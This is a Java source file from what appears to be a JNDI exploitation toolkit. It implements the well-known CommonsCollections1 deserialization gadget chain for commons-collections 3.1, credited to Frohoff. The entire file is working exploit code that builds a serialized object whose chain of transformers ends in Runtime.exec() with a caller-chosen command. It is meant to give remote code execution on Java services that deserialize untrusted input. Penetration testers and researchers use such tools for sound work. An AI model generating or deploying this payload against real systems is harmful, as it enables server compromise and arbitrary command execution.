package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.Reflections;
import com.qi4l.jndi.gadgets.utils.cc.TransformerUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

/**
 * Gadget chain:
 * ObjectInputStream.readObject()
 * AnnotationInvocationHandler.readObject()
 * Map(Proxy).entrySet()
 * AnnotationInvocationHandler.invoke()
 * LazyMap.get()
 * ChainedTransformer.transform()
 * ConstantTransformer.transform()
 * InvokerTransformer.transform()
 * Method.invoke()
 * Class.getMethod()
 * InvokerTransformer.transform()
 * Method.invoke()
 * Runtime.getRuntime()
 * InvokerTransformer.transform()
 * Method.invoke()
 * Runtime.exec()
 * <p>
 * Requires:
 * commons-collections
 */

@SuppressWarnings({"rawtypes", "unchecked","unused"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({Authors.FROHOFF})
public class CommonsCollections1 implements ObjectPayload<InvocationHandler> {

    @Override
    public InvocationHandler getObject(String command) throws Exception {
        
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(1)});
        // real chain for after setup
        final Transformer[] transformers = TransformerUtil.makeTransformer(command);

        final Map               innerMap = new HashMap();
        final Map               lazyMap  = LazyMap.decorate(innerMap, transformerChain);
        final Map               mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
        final InvocationHandler handler  = Gadgets.createMemoizedInvocationHandler(mapProxy);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);// 反射修改iTransformers属性会触发反序列化

        return handler;
    }
}
